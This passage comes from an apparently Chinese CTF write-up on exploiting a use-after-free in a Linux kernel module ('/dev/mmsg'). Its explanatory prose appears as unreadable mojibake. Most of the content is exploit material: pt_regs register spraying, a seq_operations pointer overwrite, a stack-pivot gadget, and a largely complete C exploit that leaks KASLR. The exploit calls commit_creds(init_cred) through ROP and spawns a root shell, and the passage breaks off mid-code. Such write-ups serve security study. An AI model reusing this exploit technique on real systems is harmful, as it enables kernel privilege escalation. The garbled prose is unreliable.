class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>åœ¨ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹ä¸­, ä¸æ˜¯æ‰€æœ‰çš„å¯„å­˜å™¨éƒ½ä¼šè¢«æ”¹å˜, æ¯”å¦‚ r8 - r15, ä»–ä»¬ä¼šåœ¨å‹å…¥ pt_regs çš„æ—¶ä¿æŒ syscall ä¹‹å‰çš„å€¼. è¿™å°±ä¸ºæˆ‘ä»¬æä¾›äº†å¸ƒç½®æ•°æ®çš„å¯èƒ½æ€§. å¦‚æœåœ¨ä»…èƒ½åŠ«æŒ rip çš„æƒ…å†µä¸‹ (æ¯”å¦‚ä¸Šé¢ä»‹ç»çš„ seq_operations), è·³è½¬åˆ°æŸä¸ªå½¢å¦‚Â <code>add, rsp val; ret</code>Â çš„ gadget, é‚£ä¹ˆå°±æœ‰å¯èƒ½å°† rsp è®¾ç½®åˆ°å†…æ ¸æ ˆçš„ pt_regs ä¸Š, ä»è€Œæ‰§è¡Œæˆ‘ä»¬å¸ƒç½®çš„ ROP é“¾.</p></blockquote><ul><li><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬ rop å¾€ å†…æ ¸æ ˆçš„ pt_regs ä¸­è·³è½¬ï¼Œå°±ä¸ä¼šç»•è¿‡äº†smap</p></li><li><p>å¦‚ä½•å°†å¯„å­˜å™¨å‹å…¥: ä½¿ç”¨äº†å·§å¦™åœ°æ–¹æ³•ï¼Œsyscall è°ƒç”¨ readï¼Œå°†å¯„å­˜å™¨å‹å…¥ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡seq_operations-&gt;startæ‰§è¡Œrop</p></li><li><p>è°ƒç”¨æ¨¡æ¿+è§£é‡Šçš„æ¯”è¾ƒè¯¦ç»†çš„æ–‡ç« ï¼š<a href="https://ywhkkx.github.io/2023/02/19/seq_operations%20+%20pt_regs/">seq_operations+pt_regs</a></p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(  </span><br><span class="line">    <span class="string">&quot;mov r15, 0x55555555;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r14, 0x44444444;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r13, 0x33333333;&quot;</span>   </span><br><span class="line">    <span class="string">&quot;mov r12, 0x22222222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0xbbbb2222;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r11, 0x11111111;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r10, 0x11110000;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r9,  0x99999999;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov r8,  0x88888888;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rcx, 0x666666;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span>  </span><br><span class="line">    <span class="string">&quot;syscall&quot;</span>  </span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li>gadget: æ”¹å˜rsp, add rsp, xxx; retï¼Œè¿›è¡Œæ ˆè¿ç§»</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/2wi 0xffffffff81909b8c</span><br><span class="line">   0xffffffff81909b8c:  add    rsp,0x168</span><br><span class="line">   0xffffffff81909b93:  ret</span><br></pre></td></tr></table></figure><ul><li>ä½†æ˜¯æˆ‘ä»¬éœ€è¦äº‹å…ˆçŸ¥é“æ‰§è¡Œstart æ—¶ä¸pt_regs è·ç¦»å¤šè¿œã€‚<ul><li>ç›´æ¥ä½¿ç”¨æ²¡æœ‰å¸ƒå±€çš„è„šæœ¬ï¼Œè‡ªç„¶ä¼škernel panicï¼Œå¯ä»¥çœ‹åˆ°ripçš„å†…å®¹ï¼Œç„¶åä¸ä¸Šè¿°çš„payloadè¿›è¡Œå¯¹æ¯”ï¼Œè·å¾—åç§»</li></ul></li><li>å¹¶ä¸”è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªä¸‡èƒ½çš„æ–¹æ³•</li></ul><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><ul><li>åæ¥è¿˜æ˜¯ä¸å¯¹ï¼Œå› æ­¤å†çœ‹å‚è€ƒæ–‡ç« ï¼Œå¦‚ä¸‹ä¹Ÿå­˜åœ¨uafé—®é¢˜ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module_ioctl</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_head</span> &#123;</span></span><br><span class="line">Â  Â  Â  Â  <span class="type">char</span> description[<span class="number">16</span>];</span><br><span class="line">Â  Â  Â  Â  <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">case</span> MMSG_RECV: </span><br><span class="line">        <span class="keyword">if</span> (arg.top) &#123;</span><br><span class="line">            m = list_entry(&amp;mmsg_head-&gt;<span class="built_in">list</span>, <span class="keyword">struct</span> mmsg, <span class="built_in">list</span>);  <span class="comment">// head</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            m = find_mmsg(arg.token);   <span class="comment">// éå†æŸ¥è¯¢</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (m == <span class="literal">NULL</span> || arg.size &gt; m-&gt;size || arg.size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            ret = -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;mmsg recv\n&quot;</span>);</span><br><span class="line">        copy_to_user((<span class="type">void</span> __user *)arg.data, m-&gt;data, arg.size);</span><br><span class="line">        list_del(&amp;m-&gt;<span class="built_in">list</span>);  <span class="comment">// åŒå‘é“¾è¡¨å…ƒç´ å†…æ ¸æä¾›çš„åˆ é™¤å‡½æ•°</span></span><br><span class="line">        kfree(m-&gt;data);      <span class="comment">// head æ²¡æœ‰ï¼Œä½†æ˜¯å›ºå®šåç§»ä¸º 0x10 çš„åœ°æ–¹ï¼Œç›¸å½“äºfreeæ‰listï¼Œä¸ä¼šæŠ¥é”™</span></span><br><span class="line">        kfree(m);          </span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><h4 id="åç§»ç¡®å®š"><a href="#åç§»ç¡®å®š" class="headerlink" title="åç§»ç¡®å®š"></a>åç§»ç¡®å®š</h4><ul><li><p>add rsp valï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¯”è¾ƒå…·ä½“çš„å€¼</p></li><li><p>å¤§æ¦‚æ˜¯ <code>0x100+</code> çš„gadgetå§ï¼Œä¸å¤ªä¼šï¼Œä½†æ˜¯æ­¤ç»“æ„ä½“å¤§å°å¤§äº0x100ï¼Œå¹¶ä¸”è¦å¼€å¯syscallçš„æ ˆå¸§</p><ul><li>åº”è¯¥å¯ä»¥åœ¨ioctl ä¸‹æ–­ç‚¹ï¼Œä½†æ˜¯æˆ‘å¤±è´¥äº†ğŸ˜¥</li></ul></li></ul><h4 id="æ‰§è¡Œæµç¨‹"><a href="#æ‰§è¡Œæµç¨‹" class="headerlink" title="æ‰§è¡Œæµç¨‹"></a>æ‰§è¡Œæµç¨‹</h4><ul><li>ç›´æ¥çœ‹æŠ¥é”™:  BUG: unable to handle page fault for address: 0000000044444444 ï¼› RIP: 0010:0x44444444è·å¾—æˆ‘ä»¬ripæŒ‡é’ˆæ§åˆ¶çš„å¯„å­˜å™¨ r14</li><li>syscall ä¸ä¼šæ”¹å˜ r8-r15å†…å®¹ã€‚ç†æƒ³æƒ…å†µä¸‹r8-r15å†…å®¹ä¸å˜ï¼Œä½†æ˜¯å¯èƒ½ä¼šäº§ç”Ÿå¥‡å¦™çš„å˜åŒ–ã€‚è°ƒè¯•ï¼Œsiä¼šèµ°åˆ°startæŒ‡é’ˆçš„æ“ä½œï¼Œä»è€Œè·å¾—æ ˆç»“æ„</li><li>å‡è®¾ç†æƒ³åŒ–ä»r14-r8æ²¡æœ‰å‘ç”Ÿæ”¹å˜</li><li>si ä¸€è·¯èµ°ï¼Œä½†æ˜¯çœ‹ä¸åˆ°å¯¹åº”å†…å®¹?</li></ul><p><a href="https://b0ldfrev.gitbook.io/note/linux_kernel/kernelpwn-zhuang-tai-qie-huan-yuan-li-ji-kpti-rao-guo#0x2-bypass-kpti">KERNEL_PWNçŠ¶æ€åˆ‡æ¢åŸç†åŠKPTIç»•è¿‡</a></p><ul><li>swapgs; iretq è¿”å›ç”¨æˆ·æ€; ret rip,åœ¨æ­¤å¤„æ²¡æœ‰ä½¿ç”¨retæŒ‡ä»¤ï¼Œç›´æ¥iretq, ç›´æ¥r9ä¸ºuser_rspå°±è¡Œ</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">swapgs            </span><br><span class="line">iretq             </span><br><span class="line">rsp ---&gt; rip </span><br><span class="line">         cs</span><br><span class="line">         rflags</span><br><span class="line">         rsp</span><br><span class="line">         ss</span><br></pre></td></tr></table></figure><ul><li>swapgs_restore_regs_and_return_to_usermode: è¿™ä¸ªæ¯”ä¸Šä¸ªå¤æ‚ä¸€ç‚¹ï¼Œéœ€è¦åœ¨è¿ç§»ä¸€æ¬¡</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode + 22  </span><br><span class="line">0 // padding  </span><br><span class="line">0 // padding  </span><br><span class="line">get_shell</span><br><span class="line">user_cs  </span><br><span class="line">user_rflags  </span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure><h4 id="errors"><a href="#errors" class="headerlink" title="errors"></a>errors</h4><ol><li>qemu cpuä¸º <code>host</code> ä¹Ÿå¿…é¡»å¼€å¯kvm, åŒæ—¶å°±æ˜¯è¿™ä¸€ç‚¹ï¼Œå¯¼è‡´æˆ‘ä¸€ç›´ä¸æˆåŠŸï¼Œåæ¥å»é™¤æ‰kvmå°†cpuæ”¹ä¸ºkvm64æˆåŠŸã€‚åº”è¯¥æ˜¯æœ¬æœºçš„CPUçš„å®‰å…¨é˜²æŠ¤å¯¼è‡´ä¸€ç›´å¤±è´¥ğŸ˜¥ã€‚</li></ol><h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><ul><li>signal bypass kptiã€‚æ‰§è¡Œç”¨æˆ·æ€çš„ä»»æ„ä»£ç éƒ½ä¼šæŠ¥å‡ºä¿¡å·<code>SIGSEGV</code>ï¼Œé‚£ä¹ˆåœ¨ç¨‹åºå¼€å§‹æ—¶å°†<code>SIGSEGV</code>ä¸shellå‡½æ•°ç»‘å®šåœ¨ä¸€èµ·ï¼Œé‚£ä¹ˆè®¿é—®ç”¨æˆ·æ€ä»£ç æ—¶å°±ä¼šæŠ¥å‡ºä¿¡å·<code>SIGSEGV</code>ï¼Œå°±ä¼šæ‰§è¡Œä¿¡å·å‡½æ•°ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_GREEN <span class="string">&quot;\033[32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_RED <span class="string">&quot;\033[31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_YELLOW <span class="string">&quot;\033[33m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_DEFAULT <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_debug(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, <span class="string">&quot;[*] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span>, __FILE__, __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(fmt, ...)                                                     \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_GREEN <span class="string">&quot;[+] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,        \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_warning(fmt, ...)                                                  \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_YELLOW <span class="string">&quot;[!] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,       \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(fmt, ...)                                                    \</span></span><br><span class="line"><span class="meta">  dprintf(2, COLOR_RED <span class="string">&quot;[-] %s:%d &quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT, __FILE__,          \</span></span><br><span class="line"><span class="meta">          __LINE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> die(fmt, ...)                  \</span></span><br><span class="line"><span class="meta">  do &#123;                                 \</span></span><br><span class="line"><span class="meta">    log_error(fmt, ##__VA_ARGS__);          \</span></span><br><span class="line"><span class="meta">    log_error(<span class="string">&quot;Exit at line %d&quot;</span>, __LINE__); \</span></span><br><span class="line"><span class="meta">    exit(1);                           \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span>( getuid() ) &#123;</span><br><span class="line">  die(<span class="string">&quot;fail to get shell&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">    log_info(<span class="string">&quot;start to get root shell&quot;</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_rsp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_rsp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    log_info(<span class="string">&quot;status saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">int</span> seq;</span><br><span class="line"> <span class="keyword">if</span> ( (seq=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) == <span class="number">-1</span>) &#123;</span><br><span class="line">  die(<span class="string">&quot;seq open fail&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> seq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_ALLOC 0x1111111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_COPY 0x2222222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_RECV 0x3333333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_UPDATE 0x4444444</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_PUT_DESC 0x5555555</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMSG_GET_DESC 0x6666666</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> token;</span><br><span class="line">        <span class="type">int</span> top;</span><br><span class="line">        <span class="type">int</span> size;</span><br><span class="line">        <span class="type">char</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> nokaslr = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff9248d790</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff8108d350</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff93000e30</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff811aa376</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff8264c9a0</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_iretq = <span class="number">0xffffffff81c00ec6</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0x168_ret = <span class="number">0xffffffff81909b8c</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> mmsg_fd;</span><br><span class="line"><span class="type">int</span> seq_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploit</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    mmsg_fd = open(<span class="string">&quot;/dev/mmsg&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (mmsg_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;open device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmsg_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.token = <span class="number">1</span>;</span><br><span class="line">    arg.top = <span class="number">1</span>;</span><br><span class="line">    arg.size = <span class="number">16</span>;</span><br><span class="line">    arg.data = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="type">size_t</span> *buf = (<span class="type">size_t</span> *)arg.data;</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0x1145141145141145</span>ull;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);  <span class="comment">// bypass size check</span></span><br><span class="line">    ioctl(mmsg_fd, MMSG_RECV, &amp;arg);     <span class="comment">// free head</span></span><br><span class="line"></span><br><span class="line">    seq_fd = seq_open();</span><br><span class="line"></span><br><span class="line">    ioctl(mmsg_fd, MMSG_GET_DESC, &amp;arg);</span><br><span class="line">    log_warning(<span class="string">&quot;start leak info&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i ++) &#123;</span><br><span class="line">        log_debug(<span class="string">&quot;buf[%d] =&gt; 0x%lx\n&quot;</span>, i, buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = buf[<span class="number">0</span>] - <span class="number">0x20fac0</span>;</span><br><span class="line">    kernel_offset = kernel_base - nokaslr;</span><br><span class="line">    add_rsp_0x168_ret += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_iretq += kernel_offset;</span><br><span class="line"></span><br><span class="line">    log_info(<span class="string">&quot;kernel_offset =&gt; 0x%lx&quot;</span>, kernel_offset);</span><br><span class="line">    log_info(<span class="string">&quot;kernel_base =&gt; 0x%lx&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    buf[<span class="number">0</span>] = add_rsp_0x168_ret;</span><br><span class="line">    log_info(<span class="string">&quot;pollute =&gt; 0x%lx, maybe we can debug here&quot;</span>, buf[<span class="number">0</span>]);</span><br><span class="line">    ioctl(mmsg_fd, MMSG_PUT_DESC, &amp;arg);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   pop_rdi_ret;&quot;</span>   <span class="comment">// &lt;- rip here</span></span><br><span class="line">        <span class="string">&quot;mov r13,   init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   swapgs_iretq;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    user_rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   